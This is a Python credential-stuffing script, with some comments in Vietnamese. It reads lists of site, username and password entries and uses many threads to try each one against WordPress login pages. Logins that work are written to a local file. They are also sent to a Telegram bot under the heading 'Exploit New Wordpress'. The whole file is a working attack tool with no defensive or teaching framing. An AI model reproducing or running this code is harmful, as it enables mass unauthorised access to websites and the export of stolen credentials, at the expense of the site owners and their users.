import os
import re
from multiprocessing.dummy import Pool as ThreadPool
from requests import request
from colorama import Fore, init

init(autoreset=True)

# Nhập token và chat_id khi chạy chương trình
token = input("Enter your Telegram bot token: ")
chat_id = input("Enter your Telegram chat ID: ")

fr = Fore.RED
fg = Fore.GREEN
frs = Fore.RESET

headers = { 
    'User-Agent'  : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept'      : 'text/plain'
} 

def send_telegram_message(message):
    try:
        telegram_url = f'https://api.telegram.org/bot{token}/sendMessage'
        data = {'chat_id': chat_id, 'text': message, 'parse_mode': 'Markdown'}
        request('POST', telegram_url, data=data)
    except Exception as e:
        print(f"{fr} -| Error sending Telegram notification: {e}")

def check(url):
    try:
        site, user, passwd = '', '', ''
        if '@' in url and '#' in url:
            site = url.split("#")[0]
            user = url.split("#")[1].split("@")[0]
            passwd = url.split("#")[1].split("@")[1]
        elif url.count('|') == 2:
            data_split = url.split("|")
            site = data_split[0]
            user = data_split[1]
            passwd = data_split[2]
        else:
            raise ValueError("Invalid URL format > " + url)

    except Exception as e:
        print(f' -| Error: {e}')
        return

    try:
        resp = request(method='POST', url=site, headers=headers, data={
            'log': user,
            'pwd': passwd,
            'wp-submit': 'Log In'
        }, timeout=5).text

        if 'Dashboard' in resp:
            success_message = f"Exploit New Wordpress: `{site}||{user}||{passwd}`"
            print(' -| {:<50} --> {}[Login Successfully]'.format(url, fg))
            open("Successfully_loggeds.txt", "a").write(f"{site}#{user}@{passwd}\n")
            send_telegram_message(success_message)
        else:
            print(' -| {:<50} --> {}[Login Failed]'.format(site, fr))

    except Exception as e:
        print(' -| {:<50} --> {}[Error]'.format(site, fr))

if __name__ == "__main__":
    try:
        # Tạo tệp Successfully_loggeds.txt nếu chưa có
        open("Successfully_loggeds.txt", "w").close()

        file_path = input("Enter List: ")
        thread_count = int(input("Enter Threads: "))

        with open(file_path, 'r') as file:
            lines = file.read().splitlines()

        pp = ThreadPool(thread_count)
        results = pp.map(check, lines)
        pp.close()
        pp.join()

    except FileNotFoundError:
        print(f"Error: File '{file_path}' not found!")
    except ValueError:
        print("Error: Please enter a valid number for threads.")
